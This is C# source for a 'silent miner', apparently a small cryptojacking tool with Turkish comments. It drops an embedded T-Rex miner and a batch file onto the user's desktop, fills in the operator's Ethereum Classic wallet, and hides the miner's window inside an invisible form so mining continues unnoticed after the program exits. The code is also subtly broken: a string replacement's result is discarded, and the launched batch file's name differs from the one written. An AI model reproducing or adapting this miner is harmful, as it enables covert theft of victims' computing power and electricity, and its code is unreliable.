using Freya_Silent_Miner.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Freya_Silent_Miner
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        [DllImport("user32.dll")]
        static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

        private void Form1_Load(object sender, EventArgs e)
        {


            //Burada asıl miner'ı masaüstüne kopyalamak için byte'ını okuyoruz.
            byte[] bytes = Convert.FromBase64String(Resources.trex);

            //Burada masaüstüne droplayacağımız için öncelikle dosyayı oluşturup, daha sonra kopyaladığımız byte'ı yazıyoruz.
            File.Create(@"C:\Users\" + Environment.UserName + @"\Desktop\t-rex.exe").Dispose();
            File.WriteAllBytes(@"C:\Users\" + Environment.UserName + @"\Desktop\t-rex.exe", bytes);

            //Buraya kendi binance borsasından aldığınız ETC adresini gireceksiniz.
            string ETCADDRESS = "Enter your ethereumclassic address here.";

            //Burada miningi başlatmak için gereken bat'ın yazılarını okuduk.
            string bat = Resources.BAT;

            //Burada kendi ETC adresimi sizinkiyle değiştirdim ki benim hesabım için mining yapmasın.
            bat.Replace("0xf245a9debe5e9aa77a2e3ce9b68d188e5b777e9a", ETCADDRESS);

            //Burada da tekrar masaüstüne bat dosyası oluşturup içerisine yazıları yazdırdık.
            File.Create(@"C:\Users\" + Environment.UserName + @"\Desktop\2minersetcminer.bat").Dispose();
            File.WriteAllText(@"C:\Users\" + Environment.UserName + @"\Desktop\2minersetcminer.bat", bat);

            //Burada da mining'i silent hale dönüştüren kısım başlıyor. Form görünmez olmasına rağmen miner form'un içerisinde ki panelde çalıştığı için görünmez oluyor.
            Process p = Process.Start(@"C:\Users\" + Environment.UserName + @"\Desktop\ETC-2miners.bat");
            Thread.Sleep(500); // Allow the process to open it's window
            SetParent(p.MainWindowHandle, panel1.Handle);

            //Burada main uygulamadan çıkış yapıyoruz ancak mining hala devam ediyor.
            Application.Exit();

        }
    }
}
